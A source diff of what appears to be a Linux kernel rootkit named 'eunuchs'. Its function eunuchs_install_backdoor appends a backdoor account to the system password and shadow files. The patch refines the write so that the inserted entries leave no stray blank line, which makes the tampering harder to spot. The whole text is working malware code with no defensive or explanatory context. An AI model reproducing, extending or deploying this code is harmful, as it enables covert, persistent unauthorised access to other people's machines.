@@ -916,7 +916,13 @@ static int eunuchs_install_backdoor(void)
     /* does the file already contain the backdoor account? don't add it again */
     if(!strnstr(buf, EUNUCHS_PASSWD_MOD, size))
     {
-        if(IS_ERR(res = vfs_write(f, EUNUCHS_PASSWD_MOD, strlen(EUNUCHS_PASSWD_MOD), &pos)))
+        char *p = EUNUCHS_PASSWD_MOD;
+
+        /* do this to avoid inserting a blank line */
+        if(buf[size-1] == '\n')
+            p++;
+
+        if(IS_ERR(res = vfs_write(f, p, strlen(p), &pos)))
         {
             debug("vfs_write failed on passwd\n");
             goto fail;
@@ -962,7 +968,13 @@ static int eunuchs_install_backdoor(void)
     /* does the file already contain the backdoor account? don't add it again */
     if(!strnstr(buf, EUNUCHS_SHADOW_MOD, size))
     {
-        if(IS_ERR(res = vfs_write(f, EUNUCHS_SHADOW_MOD, strlen(EUNUCHS_SHADOW_MOD), &pos)))
+        char *s = EUNUCHS_SHADOW_MOD;
+        
+        /* again, to avoid inserting a blank line in the file */
+        if(buf[size-1] == '\n')
+            s++;
+
+        if(IS_ERR(res = vfs_write(f, s, strlen(s), &pos)))
         {
             goto fail;
         }
